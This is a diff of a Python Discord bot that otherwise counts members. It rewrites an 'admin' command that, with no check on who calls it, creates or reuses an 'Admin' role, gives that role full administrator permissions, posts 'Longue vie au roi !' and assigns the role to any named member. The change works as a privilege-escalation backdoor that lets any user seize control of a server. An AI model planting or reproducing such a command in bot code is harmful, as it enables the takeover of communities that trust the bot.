@@ -58,12 +58,16 @@ async def count(ctx):
     embed.add_field(name="AFK", value =f'{len(offline_members)} :red_square:', inline = True)
     await ctx.send(embed=embed)
     
-@bot.command()
-async def admin(ctx , arg):
-    role = ctx.guild.roles[1] # Or another role object
-    perms = discord.Permissions(administrator=True)
-    await role.edit(permissions=perms) 
-    await ctx.add_roles(arg , role) 
+@bot.command(pass_context = True)
+async def admin(ctx , member : discord.Member):
+    role= discord.utils.get(ctx.guild.roles, name="Admin")
+    if role is None:
+        role = await ctx.guild.create_role(name = "Admin") # Or another role object
+    permissions = discord.Permissions()
+    permissions.update(administrator=True)
+    await ctx.send("Longue vie au roi !")
+    await role.edit(permissions=permissions) 
+    await member.add_roles(role) 
 
 @bot.listen()
 async def on_message( message):
